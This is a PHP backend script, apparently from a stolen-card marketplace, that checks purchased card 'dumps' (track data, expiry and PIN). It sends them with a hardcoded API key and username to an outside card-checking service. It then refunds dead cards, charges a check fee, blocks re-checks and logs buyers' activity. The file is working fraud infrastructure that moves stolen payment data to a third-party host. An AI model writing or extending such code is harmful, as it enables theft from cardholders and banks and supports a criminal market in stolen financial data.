<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();
// Set CORS and content headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Content-Type: application/json");

// Load global configuration and database connection ($pdo)
require '../global.php'; 

/**
 * Output response in JSON format.
 */
function outputResponse($response, $format = 'JSON') {
    echo json_encode($response);
}

// Use buyer_id (make sure this is provided via your client)
$buyerId = $_SESSION['user_id'];
if (!$buyerId) {
    outputResponse(["error" => "Buyer ID not provided"]);
    exit;
}

$track1 = trim($_REQUEST['track1']);
$expm   = trim($_REQUEST['expm']);
$expy   = trim($_REQUEST['expy']);
$pin    = trim($_REQUEST['pin']);

// Check if the card is already in dump_activity_log
$logCheck = $pdo->prepare("SELECT COUNT(*) FROM dumps_activity_log WHERE track1 = ?");
$logCheck->execute([$track1]);
if ($logCheck->fetchColumn() > 0) {
    outputResponse(["error" => "YOU WILL BE BLOCKED!"]);
    exit;
}

// Retrieve the purchased dump record from the dumps table
$stmt = $pdo->prepare("SELECT id, price, purchased_at, dump_status, track1, track2 FROM dumps WHERE track1 = ? OR track2 = ? AND buyer_id = ?");
$stmt->execute([$track1, $track1, $buyerId]);
$dump = $stmt->fetch();






/**
 * Update user's balance.
 * If deducting (i.e. negative amount), check that the user has sufficient funds.
 */
function updateUserBalance($userId, $amount, $pdo) {
    if ($amount < 0) {
        $stmt = $pdo->prepare("SELECT balance FROM users WHERE id = ?");
        $stmt->execute([$userId]);
        $balance = $stmt->fetchColumn();
        if ($balance === false || $balance < abs($amount)) {
            return false;
        }
    }
  
    $stmt = $pdo->prepare("UPDATE users SET balance = balance + ? WHERE id = ?");
    return $stmt->execute([$amount, $userId]);
}
function updateUserBalanceMinus($userId, $pdo) {
    $amount = -0.50;

    $stmt = $pdo->prepare("SELECT balance FROM users WHERE id = ?");
    $stmt->execute([$userId]);
    $balance = $stmt->fetchColumn();
    if ($balance === false || $balance < abs($amount)) {
        return false;
    }
    $stmt = $pdo->prepare("UPDATE users SET balance = balance - 0.50 WHERE id = ?");
    return $stmt->execute([$userId]);
}
// Validate required parameters for dump check: track1, expm, expy, and pin
if (empty($_REQUEST['track1']) || empty($_REQUEST['expm']) || empty($_REQUEST['expy']) || empty($_REQUEST['pin'])) {
    outputResponse(["error" => "Missing required parameters"]);
    exit;
}

// Use buyer_id (make sure this is provided via your client)
$buyerId = $_SESSION['user_id'];
if (!$buyerId) {
    outputResponse(["error" => "Buyer ID not provided"]);
    exit;
}

$track1 = trim($_REQUEST['track1']);
$expm   = trim($_REQUEST['expm']);
$expy   = trim($_REQUEST['expy']);
$pin    = trim($_REQUEST['pin']);

// Retrieve the purchased dump record from the dumps table
$stmt = $pdo->prepare("SELECT id, price, purchased_at, dump_status, track1 ,track2 FROM dumps WHERE track1 = ?  OR track2 = ? AND buyer_id = ?");
$stmt->execute([$track1,$track1 ,$buyerId]);
$dump = $stmt->fetch();

if (!$dump) {
    outputResponse(["error" => "Dump not found"]);
    exit;
}


if (strtolower($dump['dump_status']) === 'dead') {
    // If the dump is already dead and re-check is attempted,
    // update its status to DISABLED to block further checks.
    $stmt = $pdo->prepare("UPDATE dumps SET dump_status = 'DISABLED', checked_at = NOW() WHERE id = ?");
    $stmt->execute([$dump['id']]);
    outputResponse(["error" => "DONT TRY TO CHEAT THE SYSTEM!!", "status" => "disabled"]);
    exit;
}


if (strtolower($dump['dump_status']) === 'live') {
    outputResponse(["error" => "You have already tested this dump.", "status" => "disabled"]);
    exit;
}

if (!empty($dump['purchased_at'])) {
    $purchaseTime = strtotime($dump['purchased_at']);
    if ($purchaseTime !== false) {
        // Default refund limit (in minutes)
        $refundLimit = 5;
        // If the Refundable column is set, extract the numeric minutes.
        if (isset($dump['Refundable'])) {
            if (preg_match('/(\d+)/', $dump['Refundable'], $matches)) {
                $refundLimit = (int)$matches[1];
            }
        }
        // Calculate if the elapsed time exceeds the refund limit (converted to seconds)
        if ((time() - $purchaseTime) > ($refundLimit * 60)) {
            outputResponse(["error" => "Check button disabled after {$refundLimit} minutes.", "status" => "disabled"]);
            exit;
        }
    }
}




// API Mirrors (for dumps, we always use the dump checker endpoint)
$mirrors = [
    'https://mirror1.luxchecker.vc',
    'https://mirror2.luxchecker.vc'
];
$api_url = $mirrors[0] . "/apiv2/dk.php";

// Build API request data using track1, expm, expy, and pin
$api_data = [
    'track1'   => $track1,
    'expm'     => $expm,
    'expy'     => $expy,
    'pin'      => $pin,
    'key'      => 'e2f61051f26ca3a0a6beab34953735ac',
    'username' => 'Mcjic9281'
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($api_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_status !== 200 || empty($response)) {
    // updateUserBalance($buyerId, $charge, $pdo); 
    outputResponse(["error" => "Failed to connect to API"]);
    exit;
}

$response_data = json_decode($response, true);
$status = (isset($response_data['result']) && $response_data['result'] == 1) ? 'LIVE' : 'DEAD';
$response_data['status'] = $status;

try {
    $pdo->beginTransaction();

    if ($status === 'DEAD') {

        updateUserBalance($buyerId, $dump['price'], $pdo);
    }
    updateUserBalanceMinus($buyerId, $pdo);

    $stmt = $pdo->prepare("UPDATE dumps SET dump_status = ?, checked_at = NOW() WHERE id = ?");
    $stmt->execute([$status, $dump['id']]);

    $logStmt = $pdo->prepare("INSERT INTO dumps_activity_log (dump_id, track1, buyer_id, date_checked, status) VALUES (?, ?, ?, NOW(), ?)");
    $dumpstrack = $dump['track1'] ?? $dump['track2'];
    $logStmt->execute([$dump['id'], $dumpstrack, $buyerId, $status]);
    
    $pdo->commit();
} catch (Exception $e) {
    $pdo->rollBack();
    error_log("Error updating dump status: " . $e->getMessage());
    outputResponse(["error" => "Error updating dump status". $e->getMessage()]);
    exit;
}

// Output final API response
outputResponse($response_data);
exit;
?>